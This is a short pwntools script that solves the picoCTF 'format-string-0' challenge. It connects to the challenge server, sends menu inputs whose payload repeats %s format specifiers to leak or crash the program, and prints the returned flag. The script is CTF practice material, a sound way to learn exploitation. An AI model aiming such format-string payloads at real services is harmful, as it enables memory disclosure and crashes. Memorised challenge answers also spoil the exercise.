from pwn import *

context.binary = elf = ELF("./format-string-0", checksec=False)
#io = elf.process()
io = remote("mimas.picoctf.net", 53240)
#context.log_level = "debug"

io.sendlineafter(b": ", b"Gr%114d_Cheese")
payload = b"Cla%sic_Che%s%steak" * 2
log.info("Sending payload")
io.sendlineafter(b": ", payload)

io.recvuntil(b"There is no such burger yet!\n\n")
flag = io.recvline().strip()
log.success(flag.decode())

io.close()
